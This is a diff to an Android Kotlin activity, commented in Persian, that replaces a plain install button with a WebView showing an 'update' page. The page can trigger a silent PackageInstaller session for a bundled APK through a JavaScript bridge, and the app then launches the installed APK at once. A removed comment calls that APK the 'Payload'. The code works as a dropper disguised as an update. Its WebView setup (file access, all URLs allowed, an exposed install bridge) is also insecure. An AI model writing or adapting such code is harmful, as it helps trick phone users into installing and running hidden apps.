@@ -9,7 +9,6 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageInstaller
 import android.content.pm.PackageManager
-import android.graphics.Color
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -17,16 +16,13 @@ import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
 import android.util.Log
-import android.util.TypedValue
-import android.view.Gravity
-import android.widget.Button
-import android.widget.LinearLayout
-import android.widget.TextView
+import android.webkit.JavascriptInterface
+import android.webkit.WebChromeClient
+import android.webkit.WebView
+import android.webkit.WebViewClient
 import android.widget.Toast
 import java.io.File
 import java.io.FileOutputStream
-import java.io.InputStream
-import java.io.OutputStream
 
 class MainActivity : Activity() {
 
@@ -37,11 +33,11 @@ class MainActivity : Activity() {
         private const val ACTION_INSTALL = "com.example.installer.INSTALL"
     }
 
-    private lateinit var tvStatus: TextView
-    private lateinit var btnInstall: Button
+    private lateinit var webView: WebView
     private var packageName: String? = null
     private var mainActivity: String? = null
     private val handler = Handler(Looper.getMainLooper())
+    private var isInstalling = false
 
     private val installReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
@@ -54,8 +50,9 @@ class MainActivity : Activity() {
                 }
 
                 PackageInstaller.STATUS_SUCCESS -> {
-                    tvStatus.text = "✅ Installed!\n\nLaunching..."
-                    toast("Opening app now!")
+                    handler.post {
+                        toast("✅ Installed!")
+                    }
 
                     // ⭐ فوری باز کن - همین الان!
                     handler.postDelayed({
@@ -64,8 +61,12 @@ class MainActivity : Activity() {
                 }
 
                 else -> {
-                    toast("Installation failed")
-                    btnInstall.isEnabled = true
+                    handler.post {
+                        isInstalling = false
+                        toast("Installation failed")
+                        // برگشت به صفحه اصلی
+                        webView.loadUrl("file:///android_asset/update/update.html?error=true")
+                    }
                 }
             }
         }
@@ -76,42 +77,67 @@ class MainActivity : Activity() {
 
         registerReceiver(installReceiver, IntentFilter(ACTION_INSTALL))
 
-        val main = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(dp(16), dp(16), dp(16), dp(16))
-            gravity = Gravity.CENTER
-            setBackgroundColor(Color.WHITE)
+        // راه‌اندازی WebView
+        webView = WebView(this).apply {
+            settings.apply {
+                javaScriptEnabled = true
+                domStorageEnabled = true
+                allowFileAccess = true
+                allowContentAccess = true
+                mediaPlaybackRequiresUserGesture = false
+                javaScriptCanOpenWindowsAutomatically = true
+            }
+
+            webViewClient = object : WebViewClient() {
+                override fun onPageFinished(view: WebView?, url: String?) {
+                    super.onPageFinished(view, url)
+                }
+
+                override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
+                    // اجازه بده همه URL ها داخل WebView لود بشن
+                    return false
+                }
+            }
+
+            webChromeClient = WebChromeClient()
         }
 
-        tvStatus = TextView(this).apply {
-            text = "Ready"
-            setTextSize(TypedValue.COMPLEX_UNIT_SP, 22f)
-            gravity = Gravity.CENTER
-            setTextColor(Color.parseColor("#333333"))
-        }
-        main.addView(tvStatus)
+        // اضافه کردن JavaScript Interface
+        webView.addJavascriptInterface(WebAppInterface(), "Android")
 
-        btnInstall = Button(this).apply {
-            text = "INSTALL"
-            setTextSize(TypedValue.COMPLEX_UNIT_SP, 20f)
-            setOnClickListener { checkPermission() }
-            layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.WRAP_CONTENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            ).apply {
-                topMargin = dp(20)
+        // لود کردن صفحه اصلی
+        webView.loadUrl("file:///android_asset/update/update.html")
+
+        setContentView(webView)
+    }
+
+    // JavaScript Interface برای ارتباط HTML با Android
+    inner class WebAppInterface {
+        @JavascriptInterface
+        fun installPlugin() {
+            handler.post {
+                if (!isInstalling) {
+                    checkPermission()
+                }
             }
         }
-        main.addView(btnInstall)
 
-        setContentView(main)
+        @JavascriptInterface
+        fun onInstallComplete() {
+            handler.post {
+                // بعد از نصب موفق، به صفحه اصلی برگرد
+                webView.postDelayed({
+                    webView.loadUrl("file:///android_asset/update/update.html?installed=true")
+                }, 1000)
+            }
+        }
     }
 
     private fun checkPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             if (!packageManager.canRequestPackageInstalls()) {
                 val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
-                    data = Uri.parse("package:$packageName")
+                    data = Uri.parse("package:${this@MainActivity.packageName}")
                 }
                 startActivityForResult(intent, REQUEST_INSTALL)
                 return
@@ -121,8 +147,13 @@ class MainActivity : Activity() {
     }
 
     private fun install() {
-        tvStatus.text = "Installing..."
-        btnInstall.isEnabled = false
+        if (isInstalling) return
+        isInstalling = true
+
+        // نمایش صفحه نصب
+        handler.post {
+            webView.loadUrl("file:///android_asset/update/installing.html")
+        }
 
         Thread {
             var session: PackageInstaller.Session? = null
@@ -131,8 +162,9 @@ class MainActivity : Activity() {
 
                 if (packageName == null) {
                     handler.post {
+                        isInstalling = false
                         toast("Cannot read APK")
-                        btnInstall.isEnabled = true
+                        webView.loadUrl("file:///android_asset/update/update.html?error=apk")
                     }
                     return@Thread
                 }
@@ -188,8 +220,9 @@ class MainActivity : Activity() {
                 Log.e(TAG, "Error", e)
                 session?.abandon()
                 handler.post {
+                    isInstalling = false
                     toast("Failed!")
-                    btnInstall.isEnabled = true
+                    webView.loadUrl("file:///android_asset/update/update.html?error=install")
                 }
             }
         }.start()
@@ -254,9 +287,10 @@ class MainActivity : Activity() {
                 // روش 4: getLaunchIntent
                 tryMethod4()
 
-                // بستن Payload
-                Thread.sleep(1000)
-                finish()
+                // بستن MainActivity بعد از باز کردن اپ
+                handler.postDelayed({
+                    finish()
+                }, 1000)
 
             } catch (e: Exception) {
                 Log.e(TAG, "Error", e)
@@ -350,10 +384,20 @@ class MainActivity : Activity() {
         }
     }
 
+    override fun onBackPressed() {
+        // اگر WebView می‌تونه back بره، بره
+        if (webView.canGoBack()) {
+            webView.goBack()
+        } else {
+            super.onBackPressed()
+        }
+    }
+
     override fun onDestroy() {
         super.onDestroy()
         try {
             unregisterReceiver(installReceiver)
+            webView.destroy()
         } catch (e: Exception) {
             // Ignore
         }
